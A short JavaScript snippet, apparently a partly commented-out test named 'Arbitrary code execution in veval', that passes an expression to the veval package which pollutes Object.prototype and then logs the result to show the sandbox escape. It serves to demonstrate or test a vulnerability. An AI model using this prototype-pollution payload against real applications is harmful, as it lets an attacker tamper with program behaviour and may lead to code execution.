// test("Arbitrary code execution in veval", () => {
//   expect.assertions(2);
  const ve = require("veval");
console.log({}.polluted);
  try {
    ve({ hi: 0 }, "1 + (this.constructor.prototype.polluted = `yes`);");
  } catch (error) {}
console.log({}.polluted);
// });
